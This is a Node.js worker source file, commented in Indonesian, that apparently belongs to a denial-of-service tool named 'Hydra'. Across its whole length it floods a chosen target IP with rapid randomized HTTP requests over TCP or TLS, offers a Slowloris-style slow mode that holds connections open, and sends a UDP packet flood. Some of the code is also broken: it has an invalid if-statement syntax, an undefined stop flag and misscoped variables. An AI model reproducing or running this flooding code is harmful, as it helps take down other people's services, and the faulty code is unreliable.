// File: worker.js
const { parentPort, workerData } = require('worker_threads');
const net = require('net');
const tls = require('tls'); // Untuk koneksi HTTPS
const crypto = require('crypto');

const { targetIP, port, attackType, mode, durationMs, httpMethod, workerId } = workerData;

let sentRequests = 0;
let activeConnections = 0; // Dalam konteks worker, ini mungkin hanya koneksi aktif dari worker ini
let errors = 0;
let serverErrors = 0;
const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

// --- Helper Functions (mirip dengan Go) ---
function getRandomBigInt(max) {
    try {
        const buffer = crypto.randomBytes(Math.ceil(Math.log2(max) / 8));
        const num = buffer.readUIntBE(0, buffer.length);
        return num % max;
    } catch (e) {
        // Fallback jika crypto.randomBytes gagal (jarang terjadi)
        return Math.floor(Math.random() * max);
    }
}

function generateRandomString(length) {
    let result = '';
    for (let i = 0; i < length; i++) {
        result += CHARSET[getRandomBigInt(CHARSET.length)];
    }
    return result;
}

function getRandomUserAgent() {
    // USER_AGENTS perlu diakses dari sini atau dikirim dari main thread
    // Untuk kesederhanaan, kita gunakan dummy dulu
    return "HydraWorkerClient"; 
}

function parseHTTPStatus(responseData) {
    if (!responseData || responseData.length === 0) {
        return ["", "No Response Data"];
    }
    const responseStr = responseData.toString();
    if (responseStr.includes("HTTP/")) {
        const lines = responseStr.split('\r\n');
        if (lines.length > 0) {
            const statusLine = lines[0];
            const parts = statusLine.split(' ');
            if (parts.length >= 2) {
                return [parts[1], statusLine];
            }
        }
    }
    return ["", "Non-HTTP Response"];
}

// --- Logika Serangan ---

async function sendHttpRequest(socket, target, method, mode) {
    const randomPath = `/?${generateRandomString(10)}`;
    let headers = [
        `${method} ${randomPath} HTTP/1.1`,
        `Host: ${target}`,
        `User-Agent: ${getRandomUserAgent()}`,
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
    ];

    let bodyData = '';
    if (method === 'POST') {
        const postPayloadStr = `user=${generateRandomString(20)}&pass=${generateRandomString(20)}&data=${generateRandomString(50)}`;
        bodyData = postPayloadStr;
        headers.push('Content-Type: application/x-www-form-urlencoded');
        headers.push(`Content-Length: ${bodyData.length}`);
    }

    if (mode === 'slow') {
         headers = [
            `${method} ${randomPath} HTTP/1.1`,
            `Host: ${target}`,
            `User-Agent: ${getRandomUserAgent()}`,
            'Accept: */*',
            'Accept-Encoding: identity',
            'Connection: keep-alive',
        ];
        if (method === 'POST') {
            const postPayloadStr = `data=${generateRandomString(10)}`;
            bodyData = postPayloadStr;
            headers.push('Content-Type: application/x-www-form-urlencoded');
            headers.push(`Content-Length: ${bodyData.length}`);
        }
    }
    
    headers.push(''); // Baris kosong sebelum body
    const request = headers.join('\r\n') + (bodyData ? '\r\n' + bodyData : '');

    try {
        socket.write(request);
        sentRequests++;
        // Kirim update stats secara berkala
        if (sentRequests % 50 === 0) {
            parentPort.postMessage({ type: 'stats', sent: 50, active: activeConnections, errors: 0, serverErrors: 0 });
        }
        
        if (mode === 'slow') {
             const slowData = `X-Hydra-KeepAlive: ${generateRandomString(15)}\r\n`;
             socket.write(slowData);
        }
        return true;
    } catch (error) {
        errors++;
        parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 1, serverErrors: 0 });
        // console.error(`Worker ${workerId}: Error sending request:`, error.message);
        return false;
    }
}

async function httpAttack(socket, target, method, mode) {
    const startTime = Date.now();
    let lastWriteTime = Date.now();
    let idleLoops = 0;
    const requestQueue = []; // Simpan request untuk dikirim ulang jika perlu

    // Initial request queue population
    for (let i = 0; i < 100; i++) { // Isi awal antrian
        requestQueue.push(generateRandomString(10));
    }

    socket.on('error', (err) => {
        errors++;
        parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 1, serverErrors: 0 });
        // console.error(`Worker ${workerId}: Socket error:`, err.message);
        // Worker akan keluar jika socket error
    });

    socket.on('close', () => {
        // console.log(`Worker ${workerId}: Socket closed.`);
        // Worker akan keluar jika socket ditutup
    });

    // Timer untuk durasi serangan
    let durationTimer = null;
    if (durationMs !== null) {
        durationTimer = setTimeout(() => {
            // console.log(`Worker ${workerId}: Attack duration reached. Closing connection.`);
            socket.end(); // Menutup koneksi untuk mengakhiri loop
        }, durationMs);
    }

    const attackLoop = async () => {
        if (isStopping) return; // Jika ada sinyal berhenti dari main thread

        // Cek apakah socket masih valid
        if (socket.destroyed) {
            // console.log(`Worker ${workerId}: Socket destroyed, exiting httpAttack.`);
            return;
        }

        // Kirim request
        let requestToSend = requestQueue.shift();
        if (!requestToSend) {
            // Generate request baru jika antrian kosong
            requestToSend = generateRandomString(10);
        }
        
        const reqPath = `/?${requestToSend}`;
        let request = `${method} ${reqPath} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${getRandomUserAgent()}\r\nConnection: keep-alive\r\n\r\n`;

        if (mode === 'slow') {
            request = `${method} ${reqPath} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${getRandomUserAgent()}\r\nAccept: */*\r\nAccept-Encoding: identity\r\nConnection: keep-alive\r\n`;
        }

        try {
            socket.write(request);
            sentRequests++;
            activeConnections = 1; // Worker ini punya 1 koneksi aktif

            if (mode === 'slow') {
                 const slowData = `X-Hydra-KeepAlive: ${generateRandomString(15)}\r\n`;
                 socket.write(slowData);
            }
            lastWriteTime = Date.now();

            // Coba baca respons, tapi jangan block terlalu lama
            socket.once('data', (data) => {
                const [status, statusLine] = parseHTTPStatus(data);
                if (status && (status.startsWith('4') || status.startsWith('5'))) {
                    serverErrors++;
                    parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 0, serverErrors: 1 });
                }

                if (mode === 'normal') {
                    // console.log(`Worker ${workerId}: Received response (normal mode), closing connection.`);
                    socket.end(); // Tutup setelah respon di mode normal
                }
            });

            // Set timeout untuk baca agar tidak block selamanya
            socket.setTimeout(3000); // 3 detik timeout baca

            // Tambahkan request baru ke antrian untuk menjaga loop tetap berjalan
            requestQueue.push(generateRandomString(10));

        } catch (error) {
            errors++;
            parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 1, serverErrors: 0 });
            // console.error(`Worker ${workerId}: Error in attack loop:`, error.message);
            socket.end(); // Tutup koneksi jika ada error tulis
        }
        
        // Interval pengiriman request
        await new Promise(res => setTimeout(res, 1 + Math.floor(Math.random() * 4))); // 1-4 ms delay
        attackLoop(); // Panggil lagi untuk loop berikutnya
    };

    // Mulai loop serangan
    attackLoop();
}

// Placeholder untuk serangan UDP (perlu implementasi lebih lanjut)
async function udpAttack(socket, target, port) {
    // Ini adalah placeholder. Implementasi UDP memerlukan 'dgram' module di Node.js
    // dan logika pengiriman paket yang berbeda.
    const startTime = Date.now();
    while (true) {
        if (isStopping) break;
        if (durationMs !== null && (Date.now() - startTime > durationMs)) break;

        try {
            // Placeholder: kirim data dummy
            const payload = Buffer.from(generateRandomString(500 + Math.floor(Math.random() * 500)));
            socket.send(payload, port, target); // UDP tidak punya 'koneksi' seperti TCP
            sentRequests++;
            parentPort.postMessage({ type: 'stats', sent: 1, active: activeConnections, errors: 0, serverErrors: 0 });
            await new Promise(res => setTimeout(res, 10)); // Delay kecil
        } catch (error) {
            errors++;
            parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 1, serverErrors: 0 });
            // console.error(`Worker ${workerId}: UDP send error:`, error.message);
            break; // Keluar jika error kirim
        }
    }
}

// --- Fungsi Utama Worker ---
async function runWorker() {
    let socket = null;
    let isConnectionSuccessful = false;

    try {
        if (attackType === 'http') {
            const options = {
                host: targetIP,
                port: port,
                timeout: 5000 // Timeout koneksi 5 detik
            };

            if (mode === 'slow') {
                // Untuk mode slow, koneksi mungkin tidak langsung ditutup
                // Kita tidak bisa langsung pakai 'Connection: keep-alive' karena socket akan tetap terbuka
                // Kita perlu handler timeout untuk memutus koneksi jika tidak ada aktivitas
            }
            
            // Gunakan TLS untuk HTTPS
            if port === 443 || attackType === 'https' {
                socket = tls.connect(options);
            } else {
                socket = net.connect(options);
            }

            socket.on('connect', () => {
                // console.log(`Worker ${workerId}: Connected to ${targetIP}:${port}`);
                isConnectionSuccessful = true;
                activeConnections = 1;
                parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 0, serverErrors: 0 });
                httpAttack(socket, targetIP, httpMethod, mode);
            });

            socket.on('timeout', () => {
                // console.log(`Worker ${workerId}: Socket timeout.`);
                errors++;
                parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 1, serverErrors: 0 });
                socket.end(); // Tutup socket saat timeout
            });

            socket.on('end', () => {
                // console.log(`Worker ${workerId}: Socket ended.`);
                activeConnections = 0;
                parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 0, serverErrors: 0 });
                clearTimeout(durationTimer); // Bersihkan timer durasi jika ada
            });

            socket.on('close', (hadError) => {
                // console.log(`Worker ${workerId}: Socket closed. Had error: ${hadError}`);
                activeConnections = 0;
                parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 0, serverErrors: 0 });
                clearTimeout(durationTimer); // Bersihkan timer durasi jika ada
            });

        } else if (attackType === 'udp') {
            // UDP tidak benar-benar 'terhubung' seperti TCP.
            // Kita membuat socket UDP dan mengirim paket.
            const dgram = require('dgram');
            const socket = dgram.createSocket('udp4'); // Atau 'udp6'
            
            socket.on('error', (err) => {
                errors++;
                parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 1, serverErrors: 0 });
                // console.error(`Worker ${workerId}: UDP socket error:`, err.message);
                socket.close();
            });

            socket.on('message', (msg, rinfo) => {
                // UDP umumnya tidak mengirimkan respons dalam konteks serangan flood,
                // tapi jika ada, kita bisa catat server error
                serverErrors++;
                parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 0, serverErrors: 1 });
            });

            activeConnections = 1; // Anggap 1 koneksi aktif untuk UDP
            parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 0, serverErrors: 0 });
            await udpAttack(socket, targetIP, port);
            socket.close();
        } else {
            throw new Error(`Unsupported attack type: ${attackType}`);
        }

    } catch (error) {
        errors++;
        parentPort.postMessage({ type: 'stats', sent: 0, active: activeConnections, errors: 1, serverErrors: 0 });
        console.error(`Worker ${workerId}: Global error in worker:`, error.message);
    } finally {
        // Pastikan worker mengirim pesan 'done' hanya sekali
        if (socket) socket.end(); // Pastikan socket tertutup
        clearTimeout(durationTimer); // Pastikan timer durasi dibersihkan

        // Kirim status selesai ke main thread
        parentPort.postMessage({ type: 'done', workerId: workerId });
    }
}

// --- Jalankan Worker ---
runWorker();

